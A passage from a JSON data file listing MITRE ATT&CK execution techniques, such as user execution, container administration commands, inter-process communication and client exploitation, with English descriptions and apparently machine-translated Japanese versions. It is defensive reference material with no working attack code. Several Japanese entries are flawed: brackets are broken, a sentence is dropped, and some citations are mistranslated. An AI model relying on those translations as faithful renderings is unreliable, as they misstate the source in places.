                        "description_jp": "攻撃者はJavaScriptの様々な実装を悪用して実行する可能性がある。JavaScript(JS)はプラットフォームに依存しないスクリプト言語(実行時にジャストインタイムでコンパイルされる)であり、一般的にウェブページのスクリプトと関連付けられているが、JSはブラウザ以外の実行環境でも実行可能である(引用：NodeJS)\n\nJScriptは、同じスクリプト規格のMicrosoft実装である。JScriptはWindowsスクリプトエンジンを介して解釈されるため、[Component Object Model](https://attack.mitre.org/techniques/T1559/001)やInternet Explorer HTML Application(HTA)ページなど、Windowsの多くのコンポーネントと統合されている。(引用：JScrip 2018年5月号)(引用：Microsoft JScript 2007)(引用：Microsoft Windows Scripts)\n\nJavaScript for Automation（JXA）は、OSX 10.10から導入されたAppleのOpen Scripting Architecture（OSA）の一部として含まれる、JavaScriptベースのmacOSスクリプト言語です。AppleのOSAは、アプリケーションの制御、オペレーティングシステムとのインターフェイス、Appleの内部APIへのブリッジアクセスのためのスクリプト機能を提供します。OSX 10.10現在、OSAはJXAと[AppleScript](https://attack.mitre.org/techniques/T1059/002)の2つの言語のみをサポートしています。スクリプトは、コマンドラインユーティリティ<code>osascript</code>を介して実行することができ、<code>osacompile</code>を介してアプリケーションまたはスクリプトファイルにコンパイルすることができ、OSAKit Frameworkを活用することで、他のプログラムのメモリ内でコンパイルして実行することができます。(引用：Apple About Mac Scripting 2016)(引用：SpecterOps JXA 2020)(引用：SentinelOne macOS Red Team)(引用：Red Canary Silver Sparrow Feb2021)(引用：MDSec macOS JXA and VSCode)\n\n攻撃者はJavaScriptのさまざまな実装を悪用して、さまざまな動作を実行する可能性があります。一般的な使用方法としては、[Drive-by-Compromise](https://attack.mitre.org/techniques/T1189)の一部としてWebサイト上で悪意のあるスクリプトをホストしたり、セカンダリペイロードとしてこれらのスクリプトファイルをダウンロードして実行したりすることが挙げられます。これらのペイロードはテキストベースであるため、[難読化されたファイルまたは情報](https://attack.mitre.org/techniques/T1027) の一部として、敵がそのコンテンツを難読化することも非常に一般的です。"
                    }
                ]
            },
            {
                "id": "T1609",
                "name_eng": "Container Administration Command",
                "name_jp": "コンテナ管理コマンド",
                "description_eng": "Adversaries may abuse a container administration service to execute commands within a container. A container administration service such as the Docker daemon, the Kubernetes API server, or the kubelet may allow remote management of containers within an environment.(Citation: Docker Daemon CLI)(Citation: Kubernetes API)(Citation: Kubernetes Kubelet)\n\nIn Docker, adversaries may specify an entrypoint during container deployment that executes a script or command, or they may use a command such as <code>docker exec</code> to execute a command within a running container.(Citation: Docker Entrypoint)(Citation: Docker Exec) In Kubernetes, if an adversary has sufficient permissions, they may gain remote execution in a container in the cluster via interaction with the Kubernetes API server, the kubelet, or by running a command such as <code>kubectl exec</code>.(Citation: Kubectl Exec Get Shell)",
                "description_jp": "攻撃者はコンテナ管理サービスを悪用して、コンテナ内でコマンドを実行する可能性がある。Dockerデーモン、Kubernetes APIサーバー、またはkubeletなどのコンテナ管理サービスは、環境内のコンテナのリモート管理を可能にする可能性がある。 引用：DockerデーモンCLI）（引用：Kubernetes API）（引用：Kubernetes Kubelet\n\nDockerでは、敵対者はコンテナのデプロイ時にスクリプトやコマンドを実行するエントリーポイントを指定したり、<code>docker exec</code>のようなコマンドを使用して実行中のコンテナ内でコマンドを実行したりする。(引用: Docker Entrypoint)(引用: Docker Exec) Kubernetesでは、敵対者が十分な権限を持っている場合、Kubernetes APIサーバー、kubeletとの対話、または<code>kubectl exec</code>のようなコマンドの実行によって、クラスタ内のコンテナでリモート実行を得ることができる。",
                "subtechniques": []
            },
            {
                "id": "T1204",
                "name_eng": "User Execution",
                "name_jp": "ユーザー実行",
                "description_eng": "An adversary may rely upon specific actions by a user in order to gain execution. Users may be subjected to social engineering to get them to execute malicious code by, for example, opening a malicious document file or link. These user actions will typically be observed as follow-on behavior from forms of [Phishing](https://attack.mitre.org/techniques/T1566).\n\nWhile [User Execution](https://attack.mitre.org/techniques/T1204) frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it. This activity may also be seen shortly after [Internal Spearphishing](https://attack.mitre.org/techniques/T1534).\n\nAdversaries may also deceive users into performing actions such as:\n\n* Enabling [Remote Access Tools](https://attack.mitre.org/techniques/T1219), allowing direct control of the system to the adversary\n* Running malicious JavaScript in their browser, allowing adversaries to [Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)s(Citation: Talos Roblox Scam 2023)(Citation: Krebs Discord Bookmarks 2023)\n* Downloading and executing malware for [User Execution](https://attack.mitre.org/techniques/T1204)\n* Coerceing users to copy, paste, and execute malicious code manually(Citation: Reliaquest-execution)(Citation: proofpoint-selfpwn)\n\nFor example, tech support scams can be facilitated through [Phishing](https://attack.mitre.org/techniques/T1566), vishing, or various forms of user interaction. Adversaries can use a combination of these methods, such as spoofing and promoting toll-free numbers or call centers that are used to direct victims to malicious websites, to deliver and execute payloads containing malware or [Remote Access Tools](https://attack.mitre.org/techniques/T1219).(Citation: Telephone Attack Delivery)",
                "description_jp": "敵対者は、実行を獲得するために、ユーザーによる特定の行動に依存する可能性がある。ユーザは、例えば悪意のあるドキュメントファイルやリンクを開くことによって、悪意のあるコードを実行させるソーシャルエンジニアリングにさらされるかもしれません。このようなユーザの行動は、一般的に[フィッシング](https://attack.mitre.org/techniques/T1566)に続く行動として観察されます。\n\nユーザ実行](https://attack.mitre.org/techniques/T1204)は初回アクセスの直後に頻繁に発生しますが、ユーザがクリックすることを期待して敵対者が共有ディレクトリやユーザのデスクトップにファイルを置く場合など、侵入の他の段階で発生することもあります。この活動は[Internal Spearphishing](https://attack.mitre.org/techniques/T1534)の直後にも見られることがある。\n\n敵対者はまた、ユーザーを欺いて次のようなアクションを実行させることもある：\n\n* リモート・アクセス・ツール](https://attack.mitre.org/techniques/T1219)を有効にし、システムを敵に直接制御させる。\n* ブラウザで悪意のある JavaScript を実行し、[Web セッション Cookie を盗む](https://attack.mitre.org/techniques/T1539) (引用: Talos Roblox Scam 2023) (引用: Krebs Discord Bookmarks 2023)\n* ユーザー実行](https://attack.mitre.org/techniques/T1204)のためのマルウェアのダウンロードと実行。\n* 悪意のあるコードを手動でコピー、貼り付け、実行するようユーザーに強要(引用：Reliaquest-execution)(引用：proofpoint-selfpwn)\n\n例えば、技術サポート詐欺は、[フィッシング](https://attack.mitre.org/techniques/T1566)、ビッシング、または様々な形のユーザーとのやり取りを通じて行われます。攻撃者は、被害者を悪意のあるウェブサイトに誘導するために使用されるフリーダイヤルやコールセンターを偽装して宣伝するなど、これらの方法を組み合わせて使用し、マルウェアや[リモートアクセスツール](https://attack.mitre.org/techniques/T1219)を含むペイロードを配信および実行することができます(引用：Telephone Attack Delivery)。",
                "subtechniques": [
                    {
                        "id": "T1204.002",
                        "name_eng": "Malicious File",
                        "name_jp": "悪意のあるファイル",
                        "description_eng": "An adversary may rely upon a user opening a malicious file in order to gain execution. Users may be subjected to social engineering to get them to open a file that will lead to code execution. This user action will typically be observed as follow-on behavior from [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001). Adversaries may use several types of files that require a user to execute them, including .doc, .pdf, .xls, .rtf, .scr, .exe, .lnk, .pif, .cpl, and .reg.\n\nAdversaries may employ various forms of [Masquerading](https://attack.mitre.org/techniques/T1036) and [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027) to increase the likelihood that a user will open and successfully execute a malicious file. These methods may include using a familiar naming convention and/or password protecting the file and supplying instructions to a user on how to open it.(Citation: Password Protected Word Docs) \n\nWhile [Malicious File](https://attack.mitre.org/techniques/T1204/002) frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it. This activity may also be seen shortly after [Internal Spearphishing](https://attack.mitre.org/techniques/T1534).",
                        "description_jp": "敵対者は、実行を得るために、ユーザーが悪意のあるファイルを開くことを信頼するかもしれない。ユーザはコードの実行につながるファイルを開かせるためにソーシャル・エンジニアリングを受けるかもしれない。このユーザー行動は通常、[Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001)に続く行動として観察されます。攻撃者は、.doc、.pdf、.xls、.rtf、.scr、.exe、.lnk、.pif、.cpl、.regなど、ユーザーに実行を要求するいくつかのタイプのファイルを使用する可能性があります。\n\n攻撃者は、ユーザが悪意のあるファイルを開いて実行する可能性を高めるために、さまざまな形式の[マスカレード](https://attack.mitre.org/techniques/T1036)や[難読化されたファイルまたは情報](https://attack.mitre.org/techniques/T1027)を使用することがあります。このような方法には、使い慣れた命名規則を使用したり、ファイルをパスワードで保護したり、そのファイルを開く方法をユーザーに指示したりすることが含まれます（引用：パスワードで保護された Word ドキュメント）。\n\n悪意のあるファイル](https://attack.mitre.org/techniques/T1204/002)は、初回アクセスの直後に頻繁に発生しますが、侵入の他の段階で発生することもあります。例えば、敵対者が共有ディレクトリやユーザーのデスクトップにファイルを置き、ユーザーがそれをクリックすることを期待する場合などです。この活動は[Internal Spearphishing](https://attack.mitre.org/techniques/T1534)の直後にも見られることがある。"
                    },
                    {
                        "id": "T1204.003",
                        "name_eng": "Malicious Image",
                        "name_jp": "悪意のある画像",
                        "description_eng": "Adversaries may rely on a user running a malicious image to facilitate execution. Amazon Web Services (AWS) Amazon Machine Images (AMIs), Google Cloud Platform (GCP) Images, and Azure Images as well as popular container runtimes such as Docker can be backdoored. Backdoored images may be uploaded to a public repository via [Upload Malware](https://attack.mitre.org/techniques/T1608/001), and users may then download and deploy an instance or container from the image without realizing the image is malicious, thus bypassing techniques that specifically achieve Initial Access. This can lead to the execution of malicious code, such as code that executes cryptocurrency mining, in the instance or container.(Citation: Summit Route Malicious AMIs)\n\nAdversaries may also name images a certain way to increase the chance of users mistakenly deploying an instance or container from the image (ex: [Match Legitimate Resource Name or Location](https://attack.mitre.org/techniques/T1036/005)).(Citation: Aqua Security Cloud Native Threat Report June 2021)",
                        "description_jp": "攻撃者は、実行を容易にするために、悪意のあるイメージを実行しているユーザに依存する可能性があります。Amazon Web Services (AWS)のAmazon Machine Images (AMI)、Google Cloud Platform (GCP)のイメージ、Azureのイメージ、そしてDockerのような一般的なコンテナランタイムは、バックドアすることができます。バックドアされたイメージは、[Upload Malware](https://attack.mitre.org/techniques/T1608/001)を介してパブリックリポジトリにアップロードされ、ユーザはそのイメージが悪意のあるものであることに気づかずに、そのイメージからインスタンスやコンテナをダウンロードしてデプロイする可能性があります。これにより、暗号通貨のマイニングを実行するコードなど、悪意のあるコードがインスタンスやコンテナ内で実行される可能性があります。(引用：Summit Route Malicious AMI)\n\n攻撃者はまた、ユーザーが誤ってイメージからインスタンスやコンテナをデプロイする可能性を高めるために、イメージに特定の名前を付けることがあります（例：[Match Legitimate Resource Name or Location](https://attack.mitre.org/techniques/T1036/005)）。（引用：Aqua Security Cloud Native Threat Report June 2021）"
                    },
                    {
                        "id": "T1204.001",
                        "name_eng": "Malicious Link",
                        "name_jp": "悪質なリンク",
                        "description_eng": "An adversary may rely upon a user clicking a malicious link in order to gain execution. Users may be subjected to social engineering to get them to click on a link that will lead to code execution. This user action will typically be observed as follow-on behavior from [Spearphishing Link](https://attack.mitre.org/techniques/T1566/002). Clicking on a link may also lead to other execution techniques such as exploitation of a browser or application vulnerability via [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203). Links may also lead users to download files that require execution via [Malicious File](https://attack.mitre.org/techniques/T1204/002).",
                        "description_jp": "敵対者は、実行を得るために、ユーザーが悪意のあるリンクをクリックすることを信頼するかもしれない。ユーザはコードの実行につながるリンクをクリックさせるためにソーシャル・エンジニアリングを受けるかもしれない。このユーザの行動は通常[Spearphishing Link](https://attack.mitre.org/techniques/T1566/002)に続く行動として観察されます。リンクのクリックは、[Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203)によるブラウザやアプリケーションの脆弱性の悪用など、他の実行テクニックにつながることもあります。リンクはまた、[悪意のあるファイル](https://attack.mitre.org/techniques/T1204/002)を介して、実行を必要とするファイルをダウンロードさせる可能性もあります。"
                    },
                    {
                        "id": "T1204.004",
                        "name_eng": "Malicious Copy and Paste",
                        "name_jp": "悪意のあるコピー＆ペースト",
                        "description_eng": "An adversary may rely upon a user copying and pasting code in order to gain execution. Users may be subjected to social engineering to get them to copy and paste code directly into a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059).  \n\nMalicious websites, such as those used in [Drive-by Compromise](https://attack.mitre.org/techniques/T1189), may present fake error messages or CAPTCHA prompts that instruct users to open a terminal or the Windows Run Dialog box and execute an arbitrary command. These commands may be obfuscated using encoding or other techniques to conceal malicious intent. Once executed, the adversary will typically be able to establish a foothold on the victim's machine.(Citation: CloudSEK Lumma Stealer 2024)(Citation: Sekoia ClickFake 2025)(Citation: Reliaquest CAPTCHA 2024)(Citation: AhnLab LummaC2 2025)\n\nAdversaries may also leverage phishing emails for this purpose. When a user attempts to open an attachment, they may be presented with a fake error and offered a malicious command to paste as a solution.(Citation: Proofpoint ClickFix 2024)(Citation: AhnLab Malicioys Copy Paste 2024)\n\nTricking a user into executing a command themselves may help to bypass email filtering, browser sandboxing, or other mitigations designed to protect users against malicious downloaded files.",
                        "description_jp": "敵対者は、実行を得るためにユーザがコードをコピー＆ペーストすることに頼るかもしれない。ユーザは、[Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059)に直接コードをコピー・アンド・ペーストさせるために、ソーシャル・エンジニアリングにさらされるかもしれません。  \n\nDrive-by Compromise](https://attack.mitre.org/techniques/T1189)で使用されているような悪意のあるWebサイトでは、偽のエラーメッセージやCAPTCHAプロンプトが表示され、ユーザーにターミナルやWindowsの[ファイル名を指定して実行]ダイアログボックスを開き、任意のコマンドを実行するように指示することがあります。これらのコマンドは、悪意のある意図を隠すために、エンコーディングやその他の技術を使用して難読化されている可能性があります。一旦実行されると、通常、敵対者は被害者のマシン上に足場を築くことができる。 引用：CloudSEK Lumma Stealer 2024）（引用：Sekoia ClickFake 2025）（引用：Reliaquest CAPTCHA 2024）（引用：AhnLab LummaC2 2025\n\n攻撃者はまた、この目的のためにフィッシング・メールを活用することもある。ユーザーが添付ファイルを開こうとすると、偽のエラーが表示され、解決策として悪意のあるコマンドを貼り付けるよう指示されることがある（引用：Proofpoint ClickFix 2024）（引用：AhnLab Malicioys Copy Paste 2024）。\n\nユーザーを騙して自らコマンドを実行させることは、電子メールフィルタリング、ブラウザサンドボックス、または悪意のあるダウンロードファイルからユーザーを保護するために設計されたその他の緩和策を回避するのに役立つ可能性があります。"
                    }
                ]
            },
            {
                "id": "T1072",
                "name_eng": "Software Deployment Tools",
                "name_jp": "ソフトウェア・デプロイメント・ツール",
                "description_eng": "Adversaries may gain access to and use centralized software suites installed within an enterprise to execute commands and move laterally through the network. Configuration management and software deployment applications may be used in an enterprise network or cloud environment for routine administration purposes. These systems may also be integrated into CI/CD pipelines. Examples of such solutions include: SCCM, HBSS, Altiris, AWS Systems Manager, Microsoft Intune, Azure Arc, and GCP Deployment Manager.  \n\nAccess to network-wide or enterprise-wide endpoint management software may enable an adversary to achieve remote code execution on all connected systems. The access may be used to laterally move to other systems, gather information, or cause a specific effect, such as wiping the hard drives on all endpoints.\n\nSaaS-based configuration management services may allow for broad [Cloud Administration Command](https://attack.mitre.org/techniques/T1651) on cloud-hosted instances, as well as the execution of arbitrary commands on on-premises endpoints. For example, Microsoft Configuration Manager allows Global or Intune Administrators to run scripts as SYSTEM on on-premises devices joined to Entra ID.(Citation: SpecterOps Lateral Movement from Azure to On-Prem AD 2020) Such services may also utilize [Web Protocols](https://attack.mitre.org/techniques/T1071/001) to communicate back to adversary owned infrastructure.(Citation: Mitiga Security Advisory: SSM Agent as Remote Access Trojan)\n\nNetwork infrastructure devices may also have configuration management tools that can be similarly abused by adversaries.(Citation: Fortinet Zero-Day and Custom Malware Used by Suspected Chinese Actor in Espionage Operation)\n\nThe permissions required for this action vary by system configuration; local credentials may be sufficient with direct access to the third-party system, or specific domain credentials may be required. However, the system may require an administrative account to log in or to access specific functionality.",
                "description_jp": "攻撃者は、企業内にインストールされた集中型のソフトウェア・スイートへアクセスし、それを使用してコマンドを実行し、ネットワーク内を横方向に移動する可能性がある。構成管理およびソフトウェアデプロイメントアプリケーションは、企業ネットワークまたはクラウド環境において、日常的な管理目的で使用されることがある。これらのシステムは、CI/CDパイプラインに統合されることもある。このようなソリューションの例としては、以下が挙げられる：SCCM、HBSS、Altiris、AWS Systems Manager、Microsoft Intune、Azure Arc、GCP Deployment Managerなどである。  \n\nネットワーク全体または企業全体のエンドポイント管理ソフトウェアにアクセスすることで、敵対者は接続されているすべてのシステム上でリモートコード実行を実現できる可能性があります。このアクセスは、他のシステムへの横移動、情報収集、またはすべてのエンドポイントのハードドライブのワイプなど、特定の効果を引き起こすために使用される可能性があります。\n\nSaaSベースの構成管理サービスは、クラウドホスティングされたインスタンス上で広範な[Cloud Administration Command](https://attack.mitre.org/techniques/T1651)を許可するだけでなく、オンプレミスのエンドポイント上で任意のコマンドを実行することもできる。例えば、Microsoft Configuration Managerでは、グローバル管理者やIntune管理者が、Entra IDに参加したオンプレミスデバイス上でSYSTEMとしてスクリプトを実行することができます(引用: SpecterOps Lateral Movement from Azure to On-Prem AD 2020)。このようなサービスでは、[Webプロトコル](https://attack.mitre.org/techniques/T1071/001)を利用して、敵が所有するインフラストラクチャに通信を戻すこともできます(引用: Mitiga Security Advisory: SSM Agent as Remote Access Trojan)。\n\nネットワークインフラストラクチャデバイスもまた、同様に敵対者に悪用される可能性のある設定管理ツールを備えている場合があります：フォーティネットのゼロデイマルウェアとカスタムマルウェア、スパイ活動で容疑のかかった中国人が使用)\n\nこのアクションに必要な権限は、システム構成によって異なります。サードパーティシステムに直接アクセスできるローカル認証情報で十分な場合もあれば、特定のドメイン認証情報が必要な場合もあります。しかし、システムは、ログインするため、または特定の機能にアクセスするために、管理者アカウントを必要とする場合があります。",
                "subtechniques": []
            },
            {
                "id": "T1559",
                "name_eng": "Inter-Process Communication",
                "name_jp": "プロセス間通信",
                "description_eng": "Adversaries may abuse inter-process communication (IPC) mechanisms for local code or command execution. IPC is typically used by processes to share data, communicate with each other, or synchronize execution. IPC is also commonly used to avoid situations such as deadlocks, which occurs when processes are stuck in a cyclic waiting pattern. \n\nAdversaries may abuse IPC to execute arbitrary code or commands. IPC mechanisms may differ depending on OS, but typically exists in a form accessible through programming languages/libraries or native interfaces such as Windows [Dynamic Data Exchange](https://attack.mitre.org/techniques/T1559/002) or [Component Object Model](https://attack.mitre.org/techniques/T1559/001). Linux environments support several different IPC mechanisms, two of which being sockets and pipes.(Citation: Linux IPC) Higher level execution mediums, such as those of [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059)s, may also leverage underlying IPC mechanisms. Adversaries may also use [Remote Services](https://attack.mitre.org/techniques/T1021) such as [Distributed Component Object Model](https://attack.mitre.org/techniques/T1021/003) to facilitate remote IPC execution.(Citation: Fireeye Hunting COM June 2019)",
                "description_jp": "攻撃者はプロセス間通信（IPC）メカニズムを悪用し、ローカルコードやコマンドを実行する可能性がある。IPCは通常、プロセス間でデータを共有したり、互いに通信したり、実行を同期したりするために使用される。IPCはまた、プロセスが周期的な待機パターンで立ち往生するデッドロックのような状況を回避するためにも一般的に使用される。\n\n攻撃者はIPCを悪用して任意のコードやコマンドを実行する可能性がある。IPCメカニズムはOSによって異なりますが、一般的にはWindowsの[Dynamic Data Exchange](https://attack.mitre.org/techniques/T1559/002)や[Component Object Model](https://attack.mitre.org/techniques/T1559/001)のようなプログラミング言語/ライブラリやネイティブ・インターフェースを通してアクセスできる形で存在します。Linux環境はいくつかの異なるIPCメカニズムをサポートしており、そのうちの2つがソケットとパイプである(引用: Linux IPC)。[Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059)のような、より高いレベルの実行媒体も、基礎となるIPCメカニズムを活用することができる。攻撃者はまた、リモートIPCの実行を容易にするために、[Distributed Component Object Model](https://attack.mitre.org/techniques/T1021/003)のような[Remote Services](https://attack.mitre.org/techniques/T1021)を使用することもあります。(引用：Fireeye Hunting COM 2019年6月号)",
                "subtechniques": [
                    {
                        "id": "T1559.003",
                        "name_eng": "XPC Services",
                        "name_jp": "XPCサービス",
                        "description_eng": "Adversaries can provide malicious content to an XPC service daemon for local code execution. macOS uses XPC services for basic inter-process communication between various processes, such as between the XPC Service daemon and third-party application privileged helper tools. Applications can send messages to the XPC Service daemon, which runs as root, using the low-level XPC Service <code>C API</code> or the high level <code>NSXPCConnection API</code> in order to handle tasks that require elevated privileges (such as network connections). Applications are responsible for providing the protocol definition which serves as a blueprint of the XPC services. Developers typically use XPC Services to provide applications stability and privilege separation between the application client and the daemon.(Citation: creatingXPCservices)(Citation: Designing Daemons Apple Dev)\n\nAdversaries can abuse XPC services to execute malicious content. Requests for malicious execution can be passed through the application's XPC Services handler.(Citation: CVMServer Vuln)(Citation: Learn XPC Exploitation) This may also include identifying and abusing improper XPC client validation and/or poor sanitization of input parameters to conduct [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068).",
                        "description_jp": "macOSは、XPCサービスデーモンとサードパーティのアプリケーション特権ヘルパーツールの間など、さまざまなプロセス間の基本的なプロセス間通信にXPCサービスを使用します。アプリケーションは、昇格特権を必要とするタスク（ネットワーク接続など）を処理するために、低レベルの XPC サービス <code>C API</code> または高レベルの <code>NSXPCConnection API</code> を使用して、root として実行される XPC サービスデーモンにメッセージを送信できます。アプリケーションは、XPC サービスの青写真となるプロトコル定義を提供する責任があります。開発者は通常、アプリケーションの安定性と、アプリケーションクライアントとデーモン間の権限分離を提供するためにXPCサービスを使用します。(引用：CreatingXPCservices)(引用：Designing Daemons Apple Dev)\n\n攻撃者はXPCサービスを悪用して悪意のあるコンテンツを実行することができます。(引用: CVMServer 脆弱性)(引用: XPC Exploitation を学ぶ) これはまた、不適切な XPC クライアントの検証や、入力パラメータの不十分なサニタイズを特定し悪用することで、[特権昇格のための悪用](https://attack.mitre.org/techniques/T1068) を行うことも含まれます。"
                    },
                    {
                        "id": "T1559.002",
                        "name_eng": "Dynamic Data Exchange",
                        "name_jp": "ダイナミックなデータ交換",
                        "description_eng": "Adversaries may use Windows Dynamic Data Exchange (DDE) to execute arbitrary commands. DDE is a client-server protocol for one-time and/or continuous inter-process communication (IPC) between applications. Once a link is established, applications can autonomously exchange transactions consisting of strings, warm data links (notifications when a data item changes), hot data links (duplications of changes to a data item), and requests for command execution.\n\nObject Linking and Embedding (OLE), or the ability to link data between documents, was originally implemented through DDE. Despite being superseded by [Component Object Model](https://attack.mitre.org/techniques/T1559/001), DDE may be enabled in Windows 10 and most of Microsoft Office 2016 via Registry keys.(Citation: BleepingComputer DDE Disabled in Word Dec 2017)(Citation: Microsoft ADV170021 Dec 2017)(Citation: Microsoft DDE Advisory Nov 2017)\n\nMicrosoft Office documents can be poisoned with DDE commands, directly or through embedded files, and used to deliver execution via [Phishing](https://attack.mitre.org/techniques/T1566) campaigns or hosted Web content, avoiding the use of Visual Basic for Applications (VBA) macros.(Citation: SensePost PS DDE May 2016)(Citation: Kettle CSV DDE Aug 2014)(Citation: Enigma Reviving DDE Jan 2018)(Citation: SensePost MacroLess DDE Oct 2017) Similarly, adversaries may infect payloads to execute applications and/or commands on a victim device by way of embedding DDE formulas within a CSV file intended to be opened through a Windows spreadsheet program.(Citation: OWASP CSV Injection)(Citation: CSV Excel Macro Injection )\n\nDDE could also be leveraged by an adversary operating on a compromised machine who does not have direct access to a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059). DDE execution can be invoked remotely via [Remote Services](https://attack.mitre.org/techniques/T1021) such as [Distributed Component Object Model](https://attack.mitre.org/techniques/T1021/003) (DCOM).(Citation: Fireeye Hunting COM June 2019)",
                        "description_jp": "攻撃者は Windows Dynamic Data Exchange (DDE) を使用して任意のコマンドを実行する可能性がある。DDE は、アプリケーション間の 1 回限りまたは継続的なプロセス間通信 (IPC) のためのクライアントサーバープロトコルです。リンクが確立されると、アプリケーションは文字列、ウォーム データ リンク (データ項目が変更されたときの通知)、ホット データ リンク (データ項目に対する変更の複製)、およびコマンド実行要求からなるトランザクションを自律的に交換できます。\n\nObject Linking and Embedding (OLE)、つまりドキュメント間でデータをリンクする機能は、もともとDDEによって実装されていました。Component Object Model](https://attack.mitre.org/techniques/T1559/001)に取って代わられたにもかかわらず、Windows 10とMicrosoft Office 2016の大部分ではレジストリキーを介してDDEが有効になっている場合がある(引用：BleepingComputer DDE Disabled in Word Dec 2017)(Citation: Microsoft ADV170021 Dec 2017)(Citation: Microsoft DDE Advisory Nov 2017)\n\nMicrosoft Office ドキュメントは、直接または埋め込みファイルを介して DDE コマンドで汚染され、[フィッシング](https://attack.mitre.org/techniques/T1566) キャンペーンまたはホストされた Web コンテンツ経由で実行を配信するために使用され、Visual Basic for Applications (VBA) マクロの使用を回避することができます。(引用: SensePost PS DDE 2016年5月)(引用: Kettle CSV DDE 2014年8月)(引用: Enigma Reviving DDE 2018年1月)(引用: SensePost MacroLess DDE 2017年10月) 同様に、敵対者は、Windowsのスプレッドシートプログラムを通じて開くことを意図したCSVファイル内にDDE数式を埋め込む方法で、被害者のデバイス上でアプリケーションおよび/またはコマンドを実行するペイロードを感染させる可能性があります(引用: OWASP CSV Injection)(引用: CSV Excel Macro Injection )\n\nDDE は、[Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059)に直接アクセスできない、侵害されたマシン上で動作する敵対者によっても活用される可能性があります。DDEの実行は、[Distributed Component Object Model](https://attack.mitre.org/techniques/T1021/003) (DCOM)などの[リモートサービス](https://attack.mitre.org/techniques/T1021)を介してリモートから呼び出すことができます(引用: Fireeye Hunting COM 2019年6月号)。"
                    },
                    {
                        "id": "T1559.001",
                        "name_eng": "Component Object Model",
                        "name_jp": "コンポーネント・オブジェクト・モデル",
                        "description_eng": "Adversaries may use the Windows Component Object Model (COM) for local code execution. COM is an inter-process communication (IPC) component of the native Windows application programming interface (API) that enables interaction between software objects, or executable code that implements one or more interfaces.(Citation: Fireeye Hunting COM June 2019) Through COM, a client object can call methods of server objects, which are typically binary Dynamic Link Libraries (DLL) or executables (EXE).(Citation: Microsoft COM) Remote COM execution is facilitated by [Remote Services](https://attack.mitre.org/techniques/T1021) such as  [Distributed Component Object Model](https://attack.mitre.org/techniques/T1021/003) (DCOM).(Citation: Fireeye Hunting COM June 2019)\n\nVarious COM interfaces are exposed that can be abused to invoke arbitrary execution via a variety of programming languages such as C, C++, Java, and [Visual Basic](https://attack.mitre.org/techniques/T1059/005).(Citation: Microsoft COM) Specific COM objects also exist to directly perform functions beyond code execution, such as creating a [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053), fileless download/execution, and other adversary behaviors related to privilege escalation and persistence.(Citation: Fireeye Hunting COM June 2019)(Citation: ProjectZero File Write EoP Apr 2018)",
                        "description_jp": "攻撃者は、Windows コンポーネント・オブジェクト・モデル（COM）を使用してローカル・コードを実行する可能性があります。COMは、ネイティブWindowsアプリケーションプログラミングインタフェース（API）のプロセス間通信（IPC）コンポーネントであり、ソフトウェアオブジェクト、または1つ以上のインタフェースを実装する実行可能コード間の相互作用を可能にします（引用：Fireeye Hunting COM June 2019） COMを通じて、クライアントオブジェクトは、一般的にバイナリのダイナミックリンクライブラリ（DLL）または実行可能ファイル（EXE）であるサーバーオブジェクトのメソッドを呼び出すことができます。(引用：Microsoft COM) リモートCOMの実行は、[Distributed Component Object Model](https://attack.mitre.org/techniques/T1021/003) (DCOM)などの[リモートサービス](https://attack.mitre.org/techniques/T1021)によって促進される。(引用：Fireeye Hunting COM 2019年6月号)\n\nC、C++、Java、[Visual Basic](https://attack.mitre.org/techniques/T1059/005)などのさまざまなプログラミング言語を介して任意の実行を呼び出すために悪用できるさまざまなCOMインタフェースが公開されています(引用: Microsoft COM) 特定のCOMオブジェクトは、[スケジュールされたタスク/ジョブ](https://attack.mitre.org/techniques/T1053)の作成、ファイルレスのダウンロード/実行、特権の昇格や永続性に関するその他の敵対的な動作など、コードの実行を超えた機能を直接実行するためにも存在します(引用: Fireeye Hunting COM 2019年6月号)(引用: ProjectZero File Write EoP Apr 2018)"
                    }
                ]
            },
            {
                "id": "T1203",
                "name_eng": "Exploitation for Client Execution",
                "name_jp": "クライアント実行のための悪用",
                "description_eng": "Adversaries may exploit software vulnerabilities in client applications to execute code. Vulnerabilities can exist in software due to unsecure coding practices that can lead to unanticipated behavior. Adversaries can take advantage of certain vulnerabilities through targeted exploitation for the purpose of arbitrary code execution. Oftentimes the most valuable exploits to an offensive toolkit are those that can be used to obtain code execution on a remote system because they can be used to gain access to that system. Users will expect to see files related to the applications they commonly used to do work, so they are a useful target for exploit research and development because of their high utility.\n\nSeveral types exist:\n\n### Browser-based Exploitation\n\nWeb browsers are a common target through [Drive-by Compromise](https://attack.mitre.org/techniques/T1189) and [Spearphishing Link](https://attack.mitre.org/techniques/T1566/002). Endpoint systems may be compromised through normal web browsing or from certain users being targeted by links in spearphishing emails to adversary controlled sites used to exploit the web browser. These often do not require an action by the user for the exploit to be executed.\n\n### Office Applications\n\nCommon office and productivity applications such as Microsoft Office are also targeted through [Phishing](https://attack.mitre.org/techniques/T1566). Malicious files will be transmitted directly as attachments or through links to download them. These require the user to open the document or file for the exploit to run.\n\n### Common Third-party Applications\n\nOther applications that are commonly seen or are part of the software deployed in a target network may also be used for exploitation. Applications such as Adobe Reader and Flash, which are common in enterprise environments, have been routinely targeted by adversaries attempting to gain access to systems. Depending on the software and nature of the vulnerability, some may be exploited in the browser or require the user to open a file. For instance, some Flash exploits have been delivered as objects within Microsoft Office documents.",
